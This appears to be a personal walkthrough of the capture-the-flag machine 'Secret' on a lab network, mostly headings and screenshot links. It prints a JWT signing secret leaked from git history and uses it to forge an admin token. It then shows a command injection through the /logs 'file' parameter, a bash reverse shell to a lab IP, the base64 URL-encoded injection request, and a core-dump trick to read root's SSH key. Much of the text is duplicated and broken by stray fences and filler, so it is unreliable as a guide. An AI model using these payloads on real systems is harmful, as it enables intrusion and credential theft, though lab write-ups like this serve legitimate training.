![](secret%20logo.png)

## nmap all ports
![](Secret/screenshots/nmap%20all%20ports.png)

## nmap services + versions
![](Secret/screenshots/nmap%20services%20and%20versions.png)

## gobuster main
![](Secret/screenshots/gobuster%20main.png)

## wfuzz main/api
````bash
wfuzz -w /opt/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.120/api/FUZZ --hh 93

`````

![](wfuzz%20%20api.png)

## domain main
![](domain%20main.png)

![](dumbdocs%20register%20user.png)

### create user xenotim
````
POST /api/user/register HTTP/1.1

Host: 10.10.11.120:3000

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Connection: close

Upgrade-Insecure-Requests: 1

If-None-Match: W/"3248-nFUp1XavqYRgAFgHenjOsSPQ/e4"

Content-Length: 78

Content-Type: application/json



  {

"name":"xxenotim",

	"email": "a@z.com",

	"password": "xenotim"

  }

`````
![](burpsuite%20register%20user.png)

### login as xenotim
![](burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
````
![](secret%20logo.png)

## nmap all ports
![](Secret/screenshots/nmap%20all%20ports.png)

## nmap services + versions
![](Secret/screenshots/nmap%20services%20and%20versions.png)

## gobuster main
![](Secret/screenshots/gobuster%20main.png)

## wfuzz main/api
````bash
wfuzz -w /opt/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.120/api/FUZZ --hh 93

`````

![](wfuzz%20%20api.png)

## domain main
![](domain%20main.png)

![](dumbdocs%20register%20user.png)

### create user xenotim
````
/api/user/register

`````
![](burpsuite%20register%20user.png)

### login as xenotim
![](burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
````
/api/user/login

`````
### jwt tokken
````
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzNhZmNmMzFjYWVlYjA0NWUyNWQ4NzciLCJuYW1lIjoieGVub3RpbSIsImVtYWlsIjoiYUBhLmNvbSIsImlhdCI6MTY2NDg1Nzk5NH0.A4VCpUyPlc9AELrtS-lGSyVM4FqkOldwjLfga_GEODY

`````


![](access%20private%20route.png)

### access private route
![](login%20succesfull.png)


### web app source code
![](wep%20app%20source%20code%20folders%20+%20files.png)

### git show commits
![](git%20history%20commits.png)
### git viewing and accessing commit history
````
git log

git show 67d8da7a0e53d8fadeb6b

`````

### jwt secret key
![](token%20secret%20on%20git%20commits%20history.png)

### secret
````
gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

`````

### burpsuite change user account by editing the jwt token by jwt.io
### input secret key and you can change to any user you want
![](burpsuite%20manipulate%20jwt%20token.png)

![](burpsuite%20user%20changed.png)

### git show -p
![](git%20history%20logs.png)
XXXXXXXXxxxx

`````
### jwt tokken
````
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzNhZmNmMzFjYWVlYjA0NWUyNWQ4NzciLCJuYW1lIjoieGVub3RpbSIsImVtYWlsIjoiYUBhLmNvbSIsImlhdCI6MTY2NDg1Nzk5NH0.A4VCpUyPlc9AELrtS-lGSyVM4FqkOldwjLfga_GEODY

`````


![](access%20private%20route.png)

### acces private route
### use GET method
![](login%20succesfull.png)

### jwt.io name = xenotim

![](jwt.io%20jwt%20token%20name%20xenotim.png)

### name changed to theadmin with secret key we obtained
### jwt token of theadmin
![](jason%20web%20token%20(jwt)%20change%20user.png)



### code review 
![](wep%20app%20source%20code%20folders%20+%20files.png)

### git
![](git%20history%20commits.png)
### git viewing commit hystory
````
git log

git show 67d8da7a0e53d8fadeb6b

`````

### jwt secret key
![](token%20secret%20on%20git%20commits%20history.png)

````
gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

`````

### burpsuite change user account by editing the jwt token by jwt.io
### input secret key and you can change to any user you want
![](burpsuite%20manipulate%20jwt%20token.png)

![](burpsuite%20user%20changed.png)

### git show -p
![](git%20history%20logs.png)

### routes private.js
Routing refers to how an application’s endpoints (URIs) respond to client requests

### arrow function
```
// Traditional Anonymous Function
(function (a, b) {
  return a + b + 100;
});

// Arrow Function
(a, b) => a + b + 100;

const a = 4;
const b = 2;

// Traditional Anonymous Function (no arguments)
(function() {
  return a + b + 100;
});

// Arrow Function (no arguments)
() => a + b + 100;
```

### vulnerable file parameter
````js

//load module express and create new router object
const router = require('express').Router();

//load module verifytoken from current directory
const verifytoken = require('./verifytoken')

//load module user one directory up
const User = require('../model/user');

  
//get request to endpoint /priv
router.get('/priv', verifytoken, (req, res) => {

#################################################

//endpoint /logs
router.get('/logs', verifytoken, (req, res) => {

//query parameter file: /logs?file=somefilename
const file = req.query.file;

const userinfo = { name: req.user }

const name = userinfo.name.name;

//if you are user theadmin then...
if (name == 'theadmin'){

//--oneline: alias for git log --pretty=oneline --abbrev-commit", and displays the "short sha" and "short description"

//git log command on parameter file
const getLogs = `git log --oneline ${file}`;

//execute git log command on parameter file
exec(getLogs, (err , output) =>{

`````


### /logs?file=hello
![](burp%20file%20parameter.png)

### parameter file command execution
![](burp%20file%20parameter%20command%20execution.png)

### shell as user dasith
````bash
bash -i >& /dev/tcp/10.10.14.11/1111 0>&1

`````

### convert payload to base64 and url encode
````
GET /api/logs?file=hello;echo+-n+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMTExIDA%2bJjE%3d+|+base64+-d+|+bash HTTP/1.1

`````

### reverse shell as dasith
![](burp%20reverse%20shell.png)

### user.txt
![](Secret/screenshots/user.txt.png)

### find suid
![](find%20suid.png)

### core dump c
![](coredump%20function%20c.png)

### core dump to get /root/.ssh/id_rsa
![](core%20dump%20id_rsa.png)

### shell 1 run count 
![](shell%20dasith%20run%20count.png)

### core dump successfull
![](core%20dump%20successfull.png)

### make coredump readable
````
apport-unpack

`````
![](core%20dump%20prettify%20output.png)
### strings on it and output to file and grep for ssh-key
![](strings%20coredump.png)
![](Pasted%20image%2020221005213643.png)
### scp file transfer root-id_rsa 
![](scp%20file%20transfer.png)

### root.txt
![](Secret/screenshots/root.txt.png)


XXXXXXXXxxxx